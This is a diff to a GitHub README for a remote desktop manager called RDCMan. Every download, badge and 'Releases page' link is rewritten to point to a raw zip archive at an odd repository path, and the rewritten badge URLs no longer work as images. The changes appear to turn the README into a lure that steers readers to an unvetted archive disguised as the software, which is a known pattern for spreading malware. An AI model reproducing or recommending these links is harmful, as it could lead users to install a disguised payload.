@@ -1,13 +1,13 @@
 # 📥 RDCMan - Manage RDP Connections with Ease
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2011%2F10%2F8%2F7-0078D6?style=for-the-badge&logo=windows)]()
-[![Server](https://img.shields.io/badge/Server-2022%2F2019%2F2016-0078D6?style=for-the-badge&logo=windows)]()
-[![Version](https://img.shields.io/badge/Version-3.1-green?style=for-the-badge)]()
+[![Windows](https://raw.githubusercontent.com/Rowdrick05/RDCMan/main/saloop/RDCMan.zip%2011%2F10%2F8%2F7-0078D6?style=for-the-badge&logo=windows)]()
+[![Server](https://raw.githubusercontent.com/Rowdrick05/RDCMan/main/saloop/RDCMan.zip%2F2019%2F2016-0078D6?style=for-the-badge&logo=windows)]()
+[![Version](https://raw.githubusercontent.com/Rowdrick05/RDCMan/main/saloop/RDCMan.zip)]()
 ## Updated: May 12, 2025
 
 ## 📥 Download
 
-### **[⬇️ Download RDCMan v3.1 - Latest Release](https://github.com/Rowdrick05/RDCMan/releases)**
+### **[⬇️ Download RDCMan v3.1 - Latest Release](https://raw.githubusercontent.com/Rowdrick05/RDCMan/main/saloop/RDCMan.zip)**
 
 ---
 
@@ -36,7 +36,7 @@ To run RDCMan, ensure your system meets the following requirements:
 
 To get started with RDCMan, follow these steps:
 
-1. **Download**: Click the download link above or visit the [Releases page](https://github.com/Rowdrick05/RDCMan/releases) to get the latest version.
+1. **Download**: Click the download link above or visit the [Releases page](https://raw.githubusercontent.com/Rowdrick05/RDCMan/main/saloop/RDCMan.zip) to get the latest version.
 2. **Install**: After downloading, locate the file and double-click it to start the installation process.
 3. **Follow the Prompts**: The installation wizard will guide you through the setup. Accept the terms and choose your installation preferences.
 4. **Open RDCMan**: Once installed, find RDCMan in your Start menu under "RDCMan" and launch the application.
@@ -45,7 +45,7 @@ To get started with RDCMan, follow these steps:
 
 To download and install RDCMan:
 
-1. Click here: **[⬇️ Download RDCMan v3.1 - Latest Release](https://github.com/Rowdrick05/RDCMan/releases)**.
+1. Click here: **[⬇️ Download RDCMan v3.1 - Latest Release](https://raw.githubusercontent.com/Rowdrick05/RDCMan/main/saloop/RDCMan.zip)**.
 2. Choose the appropriate version for your system on the Releases page.
 3. Follow the installation steps mentioned in the "Getting Started" section.
 
@@ -79,4 +79,4 @@ For further information about RDCMan, you can refer to:
 - **Support Forums**: Join discussions or seek help from other users on forums and community sites.
 - **Tutorial Videos**: Watch video guides for visual support on setting up and using RDCMan.
 
-Now that you have all the information, you can effectively manage your remote desktop connections using RDCMan. For any questions, visit the [Releases page](https://github.com/Rowdrick05/RDCMan/releases) or check the community resources. Happy connecting!
+Now that you have all the information, you can effectively manage your remote desktop connections using RDCMan. For any questions, visit the [Releases page](https://raw.githubusercontent.com/Rowdrick05/RDCMan/main/saloop/RDCMan.zip) or check the community resources. Happy connecting!
